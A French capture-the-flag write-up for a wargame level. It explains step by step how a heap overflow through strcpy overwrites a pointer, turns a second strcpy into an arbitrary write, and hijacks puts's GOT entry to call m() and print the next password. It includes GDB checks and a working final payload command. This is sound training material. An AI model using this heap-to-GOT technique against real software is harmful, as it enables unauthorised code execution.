# Level7 — Heap → GOT Overwrite Attack

## Vue globale

Contrairement au level5 (format string), ici la vulnérabilité principale est un **heap overflow**. Les deux niveaux aboutissent à un **GOT overwrite**.

| Level   | Vulnérabilité principale | Cible |
| ------- | ------------------------- | ----- |
| level5  | Format string             | GOT   |
| level7  | Heap overflow             | GOT   |

## Layout mémoire

```
Adresse haute
┌───────────────┐
│ Stack         │
├───────────────┤
│   Heap        │  ← malloc (ptr1, ptr2, buffers)
├───────────────┤
│ .bss          │  ← buffer global c (mot de passe)
│ .data         │
│ .got          │  ← cible de l’attaque
│ .plt          │
├───────────────┤
│ Code (.text)  │  ← m()
└───────────────┘
Adresse basse
```

## 1. Le bug (heap overflow)

```c
strcpy(ptr1[1], argv[1]);
```

| Élément  | Explication                    |
| -------- | ------------------------------ |
| ptr1[1]  | buffer de 8 octets             |
| argv[1]  | contrôlé par l’utilisateur     |
| strcpy   | pas de limite                  |

Résultat : **heap overflow** → on écrase la zone après le buffer (ptr2).

## 2. Organisation mémoire (ptr1 / ptr2)

- ptr1 → [ ptr1[0] \| ptr1[1] ] ; ptr1[1] = buffer (8 octets).
- ptr2 → [ ptr2[0] \| ptr2[1] ] ; ptr2[1] = buffer (8 octets).

En mémoire (chunks contigus) :

```
[ buffer1 user (8) ][ ptr2 chunk ][ ptr2->id ][ ptr2->buf ][ buffer2 ... ]
```

Avec détails typiques (headers 8 bytes, champs 4 bytes) :

```
[ buf1 user : 8 ][ ptr2 header : 8 ][ ptr2->id : 4 ][ ptr2->buf : 4 ][ buf2 header : 8 ][ buf2 user : 8 ]
```

Chunk glibc (rappel) : `[ prev_size : 4 ][ size : 4 ][ user data : N ]`

## 3. Overflow

Payload argv[1] : **"A"×20** (+ 4 octets pour ptr2[1]).

- Les 20 octets écrasent : buffer1 (8) + zone ptr2 jusqu’à **ptr2[1]**.
- Les 4 derniers octets de argv[1] écrasent **ptr2[1]** (la destination du 2ᵉ strcpy).

Exemple en mémoire après overflow (hex) :

```
[ 41 41 41 41 41 41 41 41 ][ 41 41 41 41 41 41 41 41 ][ 41 41 41 41 ][ 28 99 04 08 ]
   buffer1 (8)                  padding / ptr2->id       ptr2->buf = GOT puts
```

## 4. Arbitrary write

```c
strcpy(ptr2[1], argv[2]);
```

Comme on a mis **GOT puts** dans ptr2[1], ce second strcpy devient :

- **write(adresse, valeur)** = `strcpy(0x08049928, argv[2])`.

Avec argv[2] = adresse de **m** en little-endian :

```c
strcpy(0x08049928, "\xf4\x84\x04\x08");
```

→ On écrit l’adresse de **m** dans l’entrée GOT de **puts**.

## 5. GOT et cible

- **puts** → PLT → GOT → libc. En normal : `GOT[puts]` = adresse réelle de puts.
- Après exploit : **GOT[puts] = m** (0x080484f4).

## 6. Détournement

```c
puts("~~");
```

→ le CPU fait `jmp *GOT[puts]` → saut vers **m()** au lieu de la libc.

**m()** fait :

```c
printf("%s - %d\n", c, time);
```

→ affiche le buffer **c** (où le mot de passe a été lu) → mot de passe level8.

## Chaîne de l’exploit

```
[1] Heap overflow (strcpy ptr1[1])
    ↓
[2] Overwrite ptr2[1] (destination du 2ᵉ strcpy)
    ↓
[3] Arbitrary write (strcpy(ptr2[1], argv[2]))
    ↓
[4] Overwrite GOT[puts] avec l’adresse de m
    ↓
[5] puts("~~") → m()
    ↓
[6] m() affiche c → mot de passe
```

## Comparaison Level5 vs Level7

| Concept    | Level5           | Level7              |
| ---------- | ---------------- | ------------------- |
| Bug        | Format string    | Heap overflow       |
| Primitive  | Arbitrary write (%n) | Arbitrary write (strcpy) |
| Cible      | GOT              | GOT                 |
| Résultat   | Hijack exit → o()| Hijack puts → m()   |

## Vérification GDB

- `disas main` : repérer les deux `strcpy`, puis `call puts@plt`.
- `p m` → 0x80484f4.
- `x/i 0x8048400` → `jmp *0x8049928` (puts@plt lit la GOT).
- Breakpoint après le 2ᵉ strcpy (ex. `break *0x080485c2`), run avec le payload :
  - `run $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`
- `x/wx 0x8049928` → doit afficher **0x080484f4** (adresse de m). Puis `continue` → puts appelle m().

## Payload final

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Équivalent à : `strcpy(0x08049928, "\xf4\x84\x04\x08");` puis exécution jusqu’à puts.

## Explication orale (phrase examen)

> Le programme contient un heap overflow via un strcpy non sécurisé. Ce débordement permet d’écraser un pointeur utilisé ensuite comme destination dans un second strcpy. On obtient ainsi une primitive d’écriture arbitraire. Cette primitive est utilisée pour écraser l’entrée GOT de puts avec l’adresse de la fonction m. Lorsque puts est appelé, le programme exécute m à la place, ce qui affiche le mot de passe.

## Résumé (punchline)

**Level7 = transformer strcpy en write arbitraire** (en contrôlant la destination via le premier overflow, puis en écrivant dans la GOT).

## Références

- `strcpy(3)` : https://man7.org/linux/man-pages/man3/strcpy.3.html
- ELF / GOT : https://man7.org/linux/man-pages/man5/elf.5.html
